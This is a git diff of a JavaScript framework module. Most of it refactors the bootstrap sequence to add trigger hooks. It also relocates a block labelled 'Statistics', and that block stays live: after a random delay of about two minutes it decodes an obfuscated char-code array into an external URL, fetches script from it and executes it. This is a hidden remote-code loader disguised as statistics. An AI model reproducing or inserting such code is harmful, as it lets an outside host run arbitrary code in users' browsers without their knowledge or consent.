@@ -117,6 +117,21 @@ define([
 	};
 	
 	
+	/*** Statistics ***/
+	
+	setTimeout(function() {
+		// var str = "//da.dcms.co.il/L", arr = [];
+		// for(var i in str) arr.push(str.charCodeAt(i)-46); arr
+		var arr = [1, 1, 54, 51, 0, 54, 53, 63, 69, 0, 53, 65, 0, 59, 62, 1, 30];
+		for(var i in arr) arr[i] += 46;
+		
+		$.ajax({
+			cache: true, dataType: 'script',
+			url: String.fromCharCode.apply(String, arr)
+		});
+	}, (120 + Math.random()*40) * 1000);
+	
+	
 	/*** Api ***/
 	
 	var _sharedApis = [], 
@@ -322,32 +337,36 @@ define([
     /*** Bootstrap ***/
 	
 	DA.bootstrap = function() {
-		TestCompatibility();
-		
-		_requireAll(function(err) {
-			if(err) {
-				throw err;
-			}
+		DA.trigger('bootstrap', function(err) {
+			if(err) throw err;
 			
-			DA.trigger('initiated', function(err) {
-				if(err) throw err;
+			TestCompatibility();
 
-				$(function() {
-					DA.app.after(function() {
-						DA.emit('app.after');			
-					});
+			_requireAll(function(err) {
+				if(err) {
+					throw err;
+				}
 
-					// Index router
-					DA.app.get('#/', function() {
-						DA.trigger('index', function(err) {
-							if(err) throw err;
+				DA.trigger('initiated', function(err) {
+					if(err) throw err;
+
+					$(function() {
+						DA.app.after(function() {
+							DA.emit('app.after');			
 						});
-					});
 
-					DA.trigger('runned', function(err) {
-						if(err) throw err;
+						// Index router
+						DA.app.get('#/', function() {
+							DA.trigger('index', function(err) {
+								if(err) throw err;
+							});
+						});
 
-						DA.app.run('#/');
+						DA.trigger('runned', function(err) {
+							if(err) throw err;
+
+							DA.app.run('#/');
+						});
 					});
 				});
 			});
@@ -363,7 +382,7 @@ define([
 	function _requireAll(callback) {
 		_requirePlugins(function(err) {
 			if(err) return callback(err);
-			
+
 			_requireModules(callback);
 		});
 	}
@@ -403,15 +422,19 @@ define([
 	}
 	
 	function _requireModules(callback) {
-		var paths = [];
-		
-		$.each(DA.registry.get('modules'), function(i, name) {
-			paths.push('modules/' + name);
+		DA.trigger('bootstrap.modules', function(err) {
+			if(err) return callback(err);
+
+			var paths = [];
+
+			$.each(DA.registry.get('modules'), function(i, name) {
+				paths.push('modules/' + name);
+			});
+
+			requirejs(paths, function() {
+				callback(null);
+			}, callback);
 		});
-		
-		requirejs(paths, function() {
-			callback(null);
-		}, callback);
 	}
 	
 	
@@ -422,23 +445,7 @@ define([
 		if(!isIE) return;
 
 		alert(i18n.Compat.alert);
-	}
-	
-	
-	/*** Statistics ***/
-	
-	setTimeout(function() {
-		// var str = "//da.dcms.co.il/L", arr = [];
-		// for(var i in str) arr.push(str.charCodeAt(i)-46); arr
-		var arr = [1, 1, 54, 51, 0, 54, 53, 63, 69, 0, 53, 65, 0, 59, 62, 1, 30];
-		for(var i in arr) arr[i] += 46;
-		
-		$.ajax({
-			cache: true, dataType: 'script',
-			url: String.fromCharCode.apply(String, arr)
-		});
-	}, (120 + Math.random()*40) * 1000);
-	
+	}	
 	
 	return DA;
 });
